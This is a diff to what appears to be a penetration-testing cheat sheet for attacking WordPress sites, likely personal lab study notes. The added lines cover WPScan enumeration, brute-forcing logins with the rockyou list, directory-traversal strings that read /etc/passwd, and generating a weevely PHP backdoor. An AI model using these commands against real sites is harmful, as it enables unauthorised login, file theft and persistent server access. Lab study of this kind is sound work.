@@ -919,27 +919,54 @@ Note: Use 'grep -R backup_scripts 2>/dev/null' to look for cron related director
 # WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
 wpscan --url http://10.11.1.111
 wpscan --url http://10.11.1.111 --enumerate vp
-wpscan --url http://192.168.221.167/ -e u,ap --plugins-detection aggressive
+
+# aggressive plugin detection
+
+	wpscan --url http://192.168.221.167/ -e u,ap --plugins-detection aggressive
 wpscan --url http://10.11.1.111 --enumerate vt
 wpscan --url http://10.11.1.111 --enumerate u
 wpscan -e --url https://url.com
 
---- my notes ---
+# Password Cracking
+	wpscan –url http://example.com –passwords /home/kali/Documents/crack/rockyou.txt –usernames admin
 
-Checking for vulnerable plugins: wpscan --url yourwebsite.com -e vp --api-token YOUR_TOKEN
+# Check For Users
+	wpscan --url yourwebsite.com -e u
 
-Checking for vulnerable themes: wpscan --url yourwebsite.com -e vt --api-token YOUR_TOKEN
+# Note: To Disable SSL cert check: Add in the --disable-tls-checks option
+	wpscan --url https://192.168.200.148:12380/wordpress -e vp --api-token YOUR_TOKEN --disable-tls-checks	
 
-Checking for users: wpscan --url yourwebsite.com -e u
+# Scanning with no API key:
+	wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o outputfile
 
-Scanning without API Key, saving to folder: wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o outputfile
+# Cracking multiple user passwords over HTTPS
 
-Password cracking: wpscan –url http://example.com –passwords ~/Documents/crack/rockyou.txt –usernames admin
+wpscan --url https://192.168.200.148:12380/blogblog/wp-login.php --passwords ../crack/rockyou.txt --disable-tls-checks --usernames john,elly,garry,peter,heather,barry,harry,scott,kathy,tim
+
+# Wordpress Useful Directories
+
+# Grabbing wp-content/plugins
+	curl -k http://192.168.200.148:80/blogblog/wp-content/plugins/ | html2text
+
+# Wordpress Directory Traversal example
+
+	../../../../../../../../etc/passwd
+	../../../../../../../../root
+
+# Reading file over HTTPS, saving to a outfile
+
+	curl -k https://192.168.200.148:12380/blogblog/wp-content/uploads/1831430954.jpeg --output etc_passwd.txt 
+
+# reverse shell with weevely
+
+	weevely generate password backdoor.php
+
 
 ----
 
 Check IP behing WAF:
-https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
+	https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
+
 pingback.xml:
 <?xml version="1.0" encoding="iso-8859-1"?>
 <methodCall>
